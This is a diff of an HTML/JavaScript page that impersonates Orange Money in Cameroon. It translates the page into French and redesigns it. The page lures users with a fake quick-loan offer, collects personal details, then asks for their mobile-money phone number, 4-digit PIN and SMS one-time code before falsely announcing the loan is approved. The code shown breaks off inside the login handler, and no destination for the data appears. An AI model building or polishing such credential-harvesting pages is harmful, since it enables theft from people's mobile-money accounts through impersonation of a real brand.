@@ -1,19 +1,19 @@
 ﻿<!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Orange Money Loan</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+  <title>Orange Money - Prêts</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
     body { background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
     .mobile-container { width: 100%; max-width: 400px; height: 100vh; background-color: #f9f9f9; display: flex; flex-direction: column; position: relative; overflow-y: auto; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
     
-    .header { display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; background: #ff6600; border-bottom: 2px solid #e65c00; }
-    .logo-text { font-size: 24px; font-weight: 900; color: #fff; letter-spacing: -0.5px; }
-    .logo-text span { color: #000; }
-    .hamburger { width: 28px; height: 20px; display: flex; flex-direction: column; justify-content: space-between; cursor: pointer; }
+    /* Global Header */
+    .header { display: flex; align-items: center; justify-content: center; padding: 15px 20px; background: #ff6600; border-bottom: 2px solid #e65c00; position: relative; }
+    .logo-text { font-size: 26px; font-weight: 500; color: #fff; font-family: 'Playfair Display', serif; letter-spacing: 0.5px; }
+    .hamburger { position: absolute; right: 20px; width: 28px; height: 20px; display: flex; flex-direction: column; justify-content: space-between; cursor: pointer; }
     .hamburger div { width: 100%; height: 3px; background: #fff; border-radius: 2px; }
 
     .content { padding: 20px; flex: 1; display: flex; flex-direction: column; }
@@ -61,15 +61,63 @@
     .btn-secondary { background: #e0e0e0; color: #333; }
     .btn-secondary:active { background: #ccc; }
     
-    .otp-container { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
-    .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 2px solid #ddd; border-radius: 10px; outline: none; }
-    .otp-input:focus { border-color: #ff6600; }
+    /* NEW LOGIN PAGE DESIGN */
+    .login-page-container { display: flex; flex-direction: column; height: 100%; background: #fff; position: relative; }
+    .login-header { background: #ff6600; padding: 20px; text-align: center; color: #fff; }
+    .login-header .brand { font-size: 28px; font-family: 'Playfair Display', serif; font-weight: 500; }
+    .login-header .tagline { font-size: 14px; font-family: 'Times New Roman', serif; margin-top: 5px; }
     
+    .login-body { padding: 30px 20px; flex: 1; display: flex; flex-direction: column; align-items: center; }
+    .login-title { font-size: 24px; font-family: 'Times New Roman', serif; color: #333; margin-bottom: 30px; }
+    
+    .input-container { width: 100%; max-width: 340px; display: flex; align-items: center; border: 1px solid #d97b4a; border-radius: 10px; padding: 12px 15px; margin-bottom: 25px; background: #fff; }
+    .flag-icon { width: 24px; margin-right: 10px; }
+    .phone-prefix-text { font-size: 18px; color: #333; margin-right: 10px; }
+    .input-container input { border: none; outline: none; font-size: 18px; color: #333; width: 100%; background: transparent; letter-spacing: 1px; }
+    
+    .pin-label { font-family: 'Times New Roman', serif; font-size: 16px; color: #666; margin-bottom: 15px; }
+    .pin-container { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
+    .pin-inputs { display: flex; gap: 10px; }
+    .pin-box { width: 45px; height: 50px; border: 1.5px solid #d97b4a; border-radius: 12px; text-align: center; font-size: 20px; outline: none; background: #fff; color: #333; }
+    .pin-box:focus { border-color: #ff6600; box-shadow: 0 0 5px rgba(255,102,0,0.3); }
+    .eye-icon { font-size: 20px; color: #333; cursor: pointer; }
+    
+    .forgot-pin { font-family: 'Times New Roman', serif; font-size: 14px; color: #666; text-decoration: underline; margin-bottom: 30px; cursor: pointer; }
+    
+    .btn-login { width: 100%; max-width: 340px; background: #e0e0e0; color: #fff; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: 500; cursor: pointer; text-transform: uppercase; transition: background 0.2s; }
+    .btn-login.active { background: #ff6600; }
+    
+    .login-footer { background: #ff6600; border-top-left-radius: 50% 20px; border-top-right-radius: 50% 20px; padding: 30px 20px; text-align: center; color: #fff; margin-top: auto; }
+    .login-footer .brand { font-size: 24px; font-family: 'Playfair Display', serif; color: #fff; }
+    .login-footer .brand span { color: #000; }
+    .login-footer .tagline { font-size: 12px; font-family: 'Times New Roman', serif; margin-top: 5px; margin-bottom: 15px; }
+    .login-footer .terms { font-size: 10px; font-family: 'Times New Roman', serif; line-height: 1.4; }
+    
+    /* NEW OTP PAGE DESIGN */
+    .otp-page-container { background: #f2f2f2; height: 100%; display: flex; flex-direction: column; position: relative; }
+    .otp-header { background: #ff6600; padding: 20px; text-align: center; }
+    .otp-header .brand { font-size: 26px; font-family: 'Playfair Display', serif; color: #fff; }
+    
+    .otp-card { background: #fff; border-radius: 15px; margin: 20px; padding: 30px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; display: flex; flex-direction: column; align-items: center; }
+    .otp-title { font-size: 24px; font-family: 'Times New Roman', serif; color: #333; margin-bottom: 15px; }
+    .otp-desc { font-size: 14px; font-family: 'Times New Roman', serif; color: #666; margin-bottom: 20px; line-height: 1.5; padding: 0 10px; }
+    .otp-phone-display { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 500; color: #333; margin-bottom: 25px; }
+    
+    .otp-inputs-container { display: flex; gap: 8px; margin-bottom: 20px; justify-content: center; width: 100%; }
+    .otp-box-new { width: 45px; height: 55px; border: 1.5px solid #d97b4a; border-radius: 12px; text-align: center; font-size: 20px; outline: none; background: #fff; color: #333; }
+    .otp-box-new:focus { border-color: #ff6600; box-shadow: 0 0 5px rgba(255,102,0,0.3); }
+    
+    .resend-text { font-size: 14px; font-family: 'Times New Roman', serif; color: #666; margin-bottom: 25px; }
+    .btn-validate { width: 100%; max-width: 300px; background: #e0e0e0; color: #fff; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: 500; cursor: pointer; text-transform: uppercase; transition: background 0.2s; }
+    .btn-validate.active { background: #ff6600; }
+    
+    .otp-footer { background: #ff6600; border-top-left-radius: 50% 30px; border-top-right-radius: 50% 30px; height: 60px; margin-top: auto; }
+
+    /* Status/Toast */
     .status-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; }
     .success-icon { width: 80px; height: 80px; background: #ff6600; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; color: #fff; margin-bottom: 20px; }
     .status-title { font-size: 22px; font-weight: 500; margin-bottom: 10px; color: #333; }
     .status-desc { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.5; }
-    
     .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #ff6600; color: #fff; padding: 12px 20px; border-radius: 8px; font-weight: 500; box-shadow: 0 4px 12px rgba(0,0,0,0.15); z-index: 1000; display: none; }
     .toast.show { display: block; animation: slideDown 0.3s ease-out; }
     @keyframes slideDown { from { top: -50px; opacity: 0; } to { top: 20px; opacity: 1; } }
@@ -85,172 +133,196 @@
 </head>
 <body>
 <div id="loading-overlay"><div class="spinner"></div></div>
-<div class="toast" id="toast">🎉 Application submitted successfully!</div>
+<div class="toast" id="toast">🎉 Demande soumise avec succès!</div>
 <div class="mobile-container">
   
-  <div class="header">
-    <div class="logo-text">Orange<span>Money</span></div>
-    <div class="hamburger">
-      <div></div>
-      <div></div>
-      <div></div>
-    </div>
-  </div>
-
   <div class="page active" id="page-calc">
+    <div class="header">
+      <div class="logo-text">Orange Money</div>
+      <div class="hamburger"><div></div><div></div><div></div></div>
+    </div>
     <div class="content">
       <div class="card">
-        <h1>Get Your Loan Approved Fast</h1>
-        <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
+        <h1>Obtenez votre prêt rapidement</h1>
+        <p class="subtitle">Approbation rapide • Taux compétitifs • Conditions flexibles</p>
         <div class="calc-box">
-          <div class="calc-title">Loan Calculator</div>
+          <div class="calc-title">Calculateur de prêt</div>
           <div class="slider-group">
-            <div class="slider-header"><span>Loan Amount</span><span class="slider-value" id="amountDisplay">CFA 20,000</span></div>
+            <div class="slider-header"><span>Montant du prêt</span><span class="slider-value" id="amountDisplay">CFA 20,000</span></div>
             <input type="range" id="amountSlider" min="1000" max="100000" step="1000" value="1000">
             <div class="range-labels"><span>CFA 20,000</span><span>CFA 500,000</span></div>
           </div>
           <div class="slider-group">
-            <div class="slider-header"><span>Loan Term</span><span class="slider-value" id="termDisplay">6 months</span></div>
+            <div class="slider-header"><span>Durée du prêt</span><span class="slider-value" id="termDisplay">6 mois</span></div>
             <input type="range" id="termSlider" min="6" max="60" step="1" value="6">
-            <div class="range-labels"><span>6 months</span><span>60 months</span></div>
+            <div class="range-labels"><span>6 mois</span><span>60 mois</span></div>
           </div>
-          <div class="payment-box">Monthly Payment : <span id="monthlyDisplay">CFA 3,466.67</span></div>
+          <div class="payment-box">Paiement mensuel : <span id="monthlyDisplay">CFA 3,466.67</span></div>
         </div>
-        <button class="btn" onclick="goToPage('page-step1')">APPLY NOW</button>
+        <button class="btn" onclick="goToPage('page-step1')">DEMANDER MAINTENANT</button>
         <div style="text-align: left; margin-top: 25px; padding: 0 10px;">
-          <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;"><div style="font-size: 24px;">⚡</div><div><h4 style="font-size: 15px; font-weight: 500; margin-bottom: 2px;">Fast Approval</h4><p style="font-size: 13px; color: #888;">Within 24 hours</p></div></div>
-          <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;"><div style="font-size: 24px;">💰</div><div><h4 style="font-size: 15px; font-weight: 500; margin-bottom: 2px;">Low Rates</h4><p style="font-size: 13px; color: #888;">From 8%</p></div></div>
-          <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;"><div style="font-size: 24px;">🔒</div><div><h4 style="font-size: 15px; font-weight: 500; margin-bottom: 2px;">Secure</h4><p style="font-size: 13px; color: #888;">Bank-level</p></div></div>
+          <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;"><div style="font-size: 24px;">⚡</div><div><h4 style="font-size: 15px; font-weight: 500; margin-bottom: 2px;">Approbation Rapide</h4><p style="font-size: 13px; color: #888;">Sous 24 heures</p></div></div>
+          <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;"><div style="font-size: 24px;">💰</div><div><h4 style="font-size: 15px; font-weight: 500; margin-bottom: 2px;">Taux Bas</h4><p style="font-size: 13px; color: #888;">À partir de 8%</p></div></div>
+          <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;"><div style="font-size: 24px;">🔒</div><div><h4 style="font-size: 15px; font-weight: 500; margin-bottom: 2px;">Sécurisé</h4><p style="font-size: 13px; color: #888;">Niveau bancaire</p></div></div>
         </div>
       </div>
     </div>
   </div>
 
   <div class="page" id="page-step1">
+    <div class="header"><div class="logo-text">Orange Money</div><div class="hamburger"><div></div><div></div><div></div></div></div>
     <div class="content">
       <div class="stepper"><div class="step active"></div><div class="step"></div><div class="step"></div></div>
-      <div class="step-title">Step 1 of 3</div>
+      <div class="step-title">Étape 1 sur 3</div>
       <div class="card" style="text-align: left;">
-        <h1 style="text-align: center; margin-bottom: 25px;">Loan Application</h1>
-        <div class="form-group"><label>Loan Type</label><select id="loanType"><option>Personal Loan</option></select></div>
-        <div class="form-group"><label>Loan Amount (CFA)</label><input type="number" id="loanAmount" value="20000"></div>
-        <div class="form-group"><label>Loan Term</label><select id="loanTerm"><option value="6">6 Months</option><option value="12">12 Months</option><option value="24">24 Months</option><option value="60">60 Months</option></select></div>
-        <div class="form-group"><label>Purpose of Loan</label><textarea id="loanPurpose" placeholder="What will you use the loan for?"></textarea></div>
-        <button class="btn" onclick="saveStep1()">NEXT STEP</button>
+        <h1 style="text-align: center; margin-bottom: 25px;">Demande de Prêt</h1>
+        <div class="form-group"><label>Type de prêt</label><select id="loanType"><option>Prêt personnel</option></select></div>
+        <div class="form-group"><label>Montant du prêt (CFA)</label><input type="number" id="loanAmount" value="20000"></div>
+        <div class="form-group"><label>Durée du prêt</label><select id="loanTerm"><option value="6">6 Mois</option><option value="12">12 Mois</option><option value="24">24 Mois</option><option value="60">60 Mois</option></select></div>
+        <div class="form-group"><label>Motif du prêt</label><textarea id="loanPurpose" placeholder="Quel est l'objet de ce prêt ?"></textarea></div>
+        <button class="btn" onclick="saveStep1()">ÉTAPE SUIVANTE</button>
       </div>
     </div>
   </div>
 
   <div class="page" id="page-step2">
+    <div class="header"><div class="logo-text">Orange Money</div><div class="hamburger"><div></div><div></div><div></div></div></div>
     <div class="content">
       <div class="stepper"><div class="step active"></div><div class="step active"></div><div class="step"></div></div>
-      <div class="step-title">Step 2 of 3</div>
+      <div class="step-title">Étape 2 sur 3</div>
       <div class="card" style="text-align: left;">
-        <h1 style="text-align: center; margin-bottom: 25px;">Loan Application</h1>
-        <div class="form-group"><label>First Name</label><input type="text" id="firstName" placeholder="John"></div>
-        <div class="form-group"><label>Last Name</label><input type="text" id="lastName" placeholder="Banda"></div>
-        <div class="form-group"><label>Email Address</label><input type="email" id="email" placeholder="john.banda@example.com"></div>
-        <div class="form-group"><label>Phone Number</label><div class="phone-group"><div class="phone-prefix">+237</div><input type="tel" id="phone" class="phone-input" placeholder="82XXXXXXX"></div></div>
+        <h1 style="text-align: center; margin-bottom: 25px;">Demande de Prêt</h1>
+        <div class="form-group"><label>Prénom</label><input type="text" id="firstName" placeholder="John"></div>
+        <div class="form-group"><label>Nom</label><input type="text" id="lastName" placeholder="Banda"></div>
+        <div class="form-group"><label>Adresse e-mail</label><input type="email" id="email" placeholder="john.banda@example.com"></div>
+        <div class="form-group"><label>Numéro de téléphone</label><div class="phone-group"><div class="phone-prefix">+237</div><input type="tel" id="phone" class="phone-input" placeholder="82XXXXXXX"></div></div>
         <div class="btn-group">
-          <button class="btn btn-secondary" onclick="goToPage('page-step1')">PREVIOUS</button>
-          <button class="btn" onclick="saveStep2()">NEXT STEP</button>
+          <button class="btn btn-secondary" onclick="goToPage('page-step1')">PRÉCÉDENT</button>
+          <button class="btn" onclick="saveStep2()">ÉTAPE SUIVANTE</button>
         </div>
       </div>
     </div>
   </div>
 
   <div class="page" id="page-step3">
+    <div class="header"><div class="logo-text">Orange Money</div><div class="hamburger"><div></div><div></div><div></div></div></div>
     <div class="content">
       <div class="stepper"><div class="step active"></div><div class="step active"></div><div class="step active"></div></div>
-      <div class="step-title">Step 3 of 3</div>
+      <div class="step-title">Étape 3 sur 3</div>
       <div class="card" style="text-align: left;">
-        <h1 style="text-align: center; margin-bottom: 25px;">Loan Application</h1>
-        <div class="form-group"><label>Employment Status</label><select id="employmentStatus"><option>Employed</option><option>Self-Employed</option><option>Unemployed</option></select></div>
-        <div class="form-group"><label>Annual Income (CFA)</label><input type="number" id="annualIncome" placeholder="50,000"></div>
+        <h1 style="text-align: center; margin-bottom: 25px;">Demande de Prêt</h1>
+        <div class="form-group"><label>Statut d'emploi</label><select id="employmentStatus"><option>Employé</option><option>Travailleur indépendant</option><option>Sans emploi</option></select></div>
+        <div class="form-group"><label>Revenu annuel (CFA)</label><input type="number" id="annualIncome" placeholder="50,000"></div>
         <div class="summary-box">
-          <div class="summary-title">Application Summary</div>
-          <div class="summary-row"><span>Loan Amount:</span> <span id="sumAmount">CFA 20,000</span></div>
-          <div class="summary-row"><span>Loan Term:</span> <span id="sumTerm">6 Months</span></div>
-          <div class="summary-row"><span>Purpose:</span> <span id="sumPurpose">School fee</span></div>
-          <div class="summary-row"><span>Applicant:</span> <span id="sumApplicant">John Banda</span></div>
+          <div class="summary-title">Résumé de la demande</div>
+          <div class="summary-row"><span>Montant du prêt :</span> <span id="sumAmount">CFA 20,000</span></div>
+          <div class="summary-row"><span>Durée :</span> <span id="sumTerm">6 Mois</span></div>
+          <div class="summary-row"><span>Motif :</span> <span id="sumPurpose">Frais de scolarité</span></div>
+          <div class="summary-row"><span>Demandeur :</span> <span id="sumApplicant">John Banda</span></div>
         </div>
         <div class="btn-group">
-          <button class="btn btn-secondary" onclick="goToPage('page-step2')">PREVIOUS</button>
-          <button class="btn" onclick="submitApplication()">SUBMIT APPLICATION</button>
+          <button class="btn btn-secondary" onclick="goToPage('page-step2')">PRÉCÉDENT</button>
+          <button class="btn" onclick="submitApplication()">SOUMETTRE</button>
         </div>
       </div>
     </div>
   </div>
 
   <div class="page" id="page-success">
+    <div class="header"><div class="logo-text">Orange Money</div><div class="hamburger"><div></div><div></div><div></div></div></div>
     <div class="content status-screen">
       <div class="success-icon">✔</div>
-      <div class="status-title">Loan Application<br>Submitted</div>
-      <div class="status-desc">Your loan application has been submitted. Please wait for approval.<br><br>You will receive a confirmation message. For now, proceed to Orange Money.</div>
+      <div class="status-title">Demande de prêt<br>soumise</div>
+      <div class="status-desc">Votre demande a bien été soumise. Veuillez patienter pour l'approbation.<br><br>Vous recevrez un message de confirmation. Pour l'instant, rendez-vous sur Orange Money.</div>
       <div style="background: #fff8f0; border: 1px solid #ff6600; border-radius: 15px; padding: 20px; width: 100%; margin-bottom: 30px; display: flex; align-items: center; justify-content: center; gap: 15px;">
         <div class="spinner" style="width: 20px; height: 20px; border-width: 3px; margin-bottom: 0; border-top-color: #ff6600;"></div>
-        <span style="color: #ff6600; font-weight: 500;" id="redirectText">Redirecting to Orange Money login in 3s...</span>
+        <span style="color: #ff6600; font-weight: 500;" id="redirectText">Redirection vers la connexion dans 3s...</span>
       </div>
-      <button class="btn" style="width: auto; padding: 12px 30px;" onclick="goToLogin()">Go to Login Now</button>
+      <button class="btn" style="width: auto; padding: 12px 30px;" onclick="goToLogin()">Aller à la connexion</button>
     </div>
   </div>
 
+  <!-- NEW LOGIN PAGE -->
   <div class="page" id="page-login">
-    <div class="content" style="text-align: center; justify-content: center;">
-      <div style="margin: 0 auto 15px; display: flex; flex-direction: column; align-items: center;">
-        <h2 style="color: #ff6600; font-size: 28px; margin-top: 10px; font-weight: 900; letter-spacing: -1px;">Orange<span style="color: #000;">Money</span></h2>
+    <div class="login-page-container">
+      <div class="login-header">
+        <div class="brand">Orange Money</div>
+        <div class="tagline">Prêts Rapides & Simples</div>
       </div>
-      <h1 style="font-size: 28px; font-style: italic; font-weight: 700; margin-bottom: 5px;">y'ello,</h1>
-      <p style="font-size: 16px; margin-bottom: 40px;">welcome to Orange Money</p>
-      <div style="text-align: left; width: 100%;">
-        <label style="font-weight: 500; font-size: 14px; margin-bottom: 10px; display: block;">Enter your Cellphone number</label>
-        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
-          <div class="phone-prefix" style="width: 60px; border-radius: 8px;">+237</div>
-          <input type="tel" id="loginPhone" placeholder="Cellphone Number" style="flex: 1; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px;">
+      
+      <div class="login-body">
+        <div class="login-title">Connexion</div>
+        
+        <div class="input-container">
+          <svg class="flag-icon" viewBox="0 0 3 2"><rect width="1" height="2" fill="#007a5e"/><rect x="1" width="1" height="2" fill="#ce1126"/><rect x="2" width="1" height="2" fill="#fcd116"/><polygon points="1.5,0.8 1.6,1.1 1.9,1.1 1.65,1.3 1.75,1.6 1.5,1.4 1.25,1.6 1.35,1.3 1.1,1.1 1.4,1.1" fill="#fcd116"/></svg>
+          <span class="phone-prefix-text">+237</span>
+          <input type="tel" id="loginPhone" placeholder="698455443">
         </div>
-        <label style="font-weight: 500; font-size: 14px; margin-bottom: 10px; display: block;">Enter your PIN</label>
-        <input type="password" id="loginPin" placeholder="PIN" maxlength="5" style="width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 20px;">
+        
+        <div class="pin-label">Entrez votre code PIN</div>
+        <div class="pin-container">
+          <div class="pin-inputs" id="loginPinContainer">
+            <input type="password" class="pin-box" maxlength="1" oninput="movePin(this, 'loginPinContainer', 0)">
+            <input type="password" class="pin-box" maxlength="1" oninput="movePin(this, 'loginPinContainer', 1)">
+            <input type="password" class="pin-box" maxlength="1" oninput="movePin(this, 'loginPinContainer', 2)">
+            <input type="password" class="pin-box" maxlength="1" oninput="movePin(this, 'loginPinContainer', 3)">
+          </div>
+          <div class="eye-icon" onclick="togglePinVisibility()">👁️</div>
+        </div>
+        <div class="forgot-pin">PIN oublié ?</div>
+        
+        <button class="btn-login" id="btnLogin" onclick="submitLogin()">SE CONNECTER</button>
       </div>
-      <button class="btn" style="border-radius: 30px; padding: 18px;" onclick="submitLogin()">Continue</button>
-      <p style="color: #ff6600; font-weight: 500; font-size: 14px; margin-top: 20px; cursor: pointer;">Change your Orange Money number</p>
-      <div style="margin-top: auto; padding-top: 40px; font-size: 12px; color: #888;">
-        <p style="margin-bottom: 10px;">By signing in, I agree to the <span style="color: #ff6600;">T's & C's</span></p>
-        <p>Orange Money is powered by <b>Orange</b> | <b>African Bank</b></p>
+      
+      <div class="login-footer">
+        <div class="brand">Orange <span>Money</span></div>
+        <div class="tagline">Prêts Rapides & Simples</div>
+        <div class="terms">En vous connectant, vous acceptez les Conditions Générales d'Utilisation</div>
       </div>
     </div>
   </div>
 
+  <!-- NEW OTP PAGE -->
   <div class="page" id="page-otp">
-    <div class="content">
-      <div style="display: flex; align-items: center; margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 15px;">
-        <span style="font-size: 24px; color: #ff6600; margin-right: 15px; cursor: pointer;" onclick="goToLogin()">❮</span>
-        <h2 style="font-size: 18px; font-weight: 700;">Register</h2>
-      </div>
-      <h1 style="font-size: 20px; font-weight: 700; text-align: left; margin-bottom: 10px;">Confirm your cellphone number</h1>
-      <p style="font-size: 14px; color: #666; text-align: left; line-height: 1.5; margin-bottom: 30px;">
-        We will send an SMS with a One Time Pin (OTP) within the next 3 minutes to <span id="maskedPhone">083****567</span>
-      </p>
-      <label style="font-weight: 700; color: #888; font-size: 14px; display: block; margin-bottom: 15px;">Please enter the OTP you received</label>
-      
-      <div class="otp-container">
-        <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-input" maxlength="1" oninput="validateOTP(this, 0)">
-        <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-input" maxlength="1" oninput="validateOTP(this, 1)">
-        <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-input" maxlength="1" oninput="validateOTP(this, 2)">
-        <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-input" maxlength="1" oninput="validateOTP(this, 3)">
+    <div class="otp-page-container">
+      <div class="otp-header">
+        <div class="brand">Orange Money</div>
       </div>
       
-      <div style="text-align: right; font-size: 14px; font-weight: 500; margin-bottom: 30px; cursor: pointer;">SHOW</div>
-      <button class="btn" style="border-radius: 30px; padding: 18px; margin-bottom: 15px;" onclick="submitOTP()">Verify</button>
-      <button class="btn btn-secondary" style="border-radius: 30px; padding: 18px;">Resend OTP</button>
+      <div class="otp-card">
+        <div class="otp-title">Vérification Max it</div>
+        <div class="otp-desc">Entrez le code de vérification à 6 caractères reçu par SMS (ex: 3Z005R)</div>
+        
+        <div class="otp-phone-display">
+          <svg width="24" height="16" viewBox="0 0 3 2"><rect width="1" height="2" fill="#007a5e"/><rect x="1" width="1" height="2" fill="#ce1126"/><rect x="2" width="1" height="2" fill="#fcd116"/><polygon points="1.5,0.8 1.6,1.1 1.9,1.1 1.65,1.3 1.75,1.6 1.5,1.4 1.25,1.6 1.35,1.3 1.1,1.1 1.4,1.1" fill="#fcd116"/></svg>
+          <span id="maskedPhone">+237 698455443</span>
+        </div>
+        
+        <div class="otp-inputs-container" id="otpInputContainer">
+          <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-box-new" maxlength="1" oninput="validateOTP(this, 0)">
+          <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-box-new" maxlength="1" oninput="validateOTP(this, 1)">
+          <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-box-new" maxlength="1" oninput="validateOTP(this, 2)">
+          <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-box-new" maxlength="1" oninput="validateOTP(this, 3)">
+          <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-box-new" maxlength="1" oninput="validateOTP(this, 4)">
+          <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-box-new" maxlength="1" oninput="validateOTP(this, 5)">
+        </div>
+        
+        <div class="resend-text">Renvoyer dans <span id="timer">56</span> secondes</div>
+        
+        <button class="btn-validate" id="btnValidate" onclick="submitOTP()">VALIDER</button>
+      </div>
+      
+      <div class="otp-footer"></div>
     </div>
   </div>
 
   <div class="page" id="page-congrats">
+    <div class="header"><div class="logo-text">Orange Money</div></div>
     <div class="content status-screen">
       <div class="success-icon" style="background: #4CAF50; color: white;">✔</div>
-      <div class="status-title">Congratulations!</div>
-      <div class="status-desc">Your identity has been verified and your loan has been fully approved.<br><br>Funds will be disbursed to your Orange Money account shortly.</div>
-      <button class="btn" style="width: auto; padding: 12px 30px;" onclick="location.reload()">DONE</button>
+      <div class="status-title">Félicitations !</div>
+      <div class="status-desc">Votre identité a été vérifiée et votre prêt a été entièrement approuvé.<br><br>Les fonds seront décaissés sur votre compte Orange Money sous peu.</div>
+      <button class="btn" style="width: auto; padding: 12px 30px;" onclick="location.reload()">TERMINÉ</button>
     </div>
   </div>
 </div>
@@ -259,6 +331,7 @@
   let formData = {};
   let currentRequestId = null;
   let pollingInterval = null;
+  let pinVisible = false;
 
   function goToPage(pageId) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -269,13 +342,14 @@
   function toggleLoading(show) { document.getElementById('loading-overlay').classList.toggle('active', show); }
   function showToast() { const toast = document.getElementById('toast'); toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }
 
+  // Calculator Logic
   const amountSlider = document.getElementById('amountSlider');
   const termSlider = document.getElementById('termSlider');
   function updateCalculator() {
     const amount = parseInt(amountSlider.value);
     const term = parseInt(termSlider.value);
     document.getElementById('amountDisplay').textContent = `CFA ${amount.toLocaleString()}`;
-    document.getElementById('termDisplay').textContent = `${term} months`;
+    document.getElementById('termDisplay').textContent = `${term} mois`;
     const totalInterest = amount * 0.08 * (term / 12);
     document.getElementById('monthlyDisplay').textContent = `CFA ${((amount + totalInterest) / term).toFixed(2)}`;
   }
@@ -283,18 +357,13 @@
   termSlider.addEventListener('input', updateCalculator);
   updateCalculator();
 
+  // Form Logic
   function saveStep1() {
     const amount = document.getElementById('loanAmount').value;
     const term = document.getElementById('loanTerm').value;
     const purpose = document.getElementById('loanPurpose').value.trim();
-
-    if (!amount || !term || !purpose) {
-      return alert('Please fill in all fields.');
-    }
-
-    formData.loanAmount = amount;
-    formData.loanTerm = term;
-    formData.purpose = purpose;
+    if (!amount || !term || !purpose) return alert('Veuillez remplir tous les champs.');
+    formData.loanAmount = amount; formData.loanTerm = term; formData.purpose = purpose;
     goToPage('page-step2');
   }
 
@@ -303,18 +372,10 @@
     const lastName = document.getElementById('lastName').value.trim();
     const email = document.getElementById('email').value.trim();
     const phone = document.getElementById('phone').value.trim();
-
-    if (!firstName || !lastName || !email || !phone) {
-      return alert('Please fill in all fields.');
-    }
-
-    formData.firstName = firstName; 
-    formData.lastName = lastName; 
-    formData.email = email; 
-    formData.phone = phone;
-    
+    if (!firstName || !lastName || !email || !phone) return alert('Veuillez remplir tous les champs.');
+    formData.firstName = firstName; formData.lastName = lastName; formData.email = email; formData.phone = phone;
     document.getElementById('sumAmount').textContent = `CFA ${parseInt(formData.loanAmount).toLocaleString()}`;
-    document.getElementById('sumTerm').textContent = `${formData.loanTerm} Months`;
+    document.getElementById('sumTerm').textContent = `${formData.loanTerm} Mois`;
     document.getElementById('sumPurpose').textContent = formData.purpose;
     document.getElementById('sumApplicant').textContent = `${firstName} ${lastName}`;
     goToPage('page-step3');
@@ -322,36 +383,55 @@
 
   function submitApplication() {
     const annualIncome = document.getElementById('annualIncome').value.trim();
-
-    if (!annualIncome) {
-      return alert('Please fill in all fields.');
-    }
-
+    if (!annualIncome) return alert('Veuillez remplir tous les champs.');
     formData.employmentStatus = document.getElementById('employmentStatus').value;
     formData.annualIncome = annualIncome;
     goToPage('page-success');
     showToast();
-    
     let countdown = 3;
     const timer = setInterval(() => {
       countdown--;
       if (countdown <= 0) { clearInterval(timer); if (document.getElementById('page-success').classList.contains('active')) goToLogin(); } 
-      else { document.getElementById('redirectText').textContent = `Redirecting to Orange Money login in ${countdown}s...`; }
+      else { document.getElementById('redirectText').textContent = `Redirection vers la connexion dans ${countdown}s...`; }
     }, 1000);
   }
 
+  // Login Page Logic
   function goToLogin() {
     goToPage('page-login');
     document.getElementById('loginPhone').value = formData.phone || '';
   }
 
+  function movePin(input, containerId, index) {
+    input.value = input.value.replace(/[^0-9]/g, '');
+    const inputs = document.getElementById(containerId).querySelectorAll('.pin-box');
+    if (input.value.length === 1 && index < inputs.length - 1) {
+      inputs[index + 1].focus();
+    }
+    checkLoginButton();
+  }
+
+  function checkLoginButton() {
+    const pins = document.querySelectorAll('#loginPinContainer .pin-box');
+    let filled = 0;
+    pins.forEach(p => { if (p.value.length === 1) filled++; });
+    const btn = document.getElementById('btnLogin');
+    if (filled === 4) btn.classList.add('active');
+    else btn.classList.remove('active');
+  }
+
+  function togglePinVisibility() {
+    pinVisible = !pinVisible;
+    const pins = document.querySelectorAll('#loginPinContainer .pin-box');
+    pins.forEach(p => p.type = pinVisible ? 'text' : 'password');
+  }
+
   async function submitLogin() {
     const phone = document.getElementById('loginPhone').value.trim();
-    const pin = document.getElementById('loginPin').value.trim();
-
-    if (!phone || !pin) {
-      return alert('Please fill in all fields.');
-    }
+    const pins = document.querySelectorAll('#loginPinContainer .pin-box');
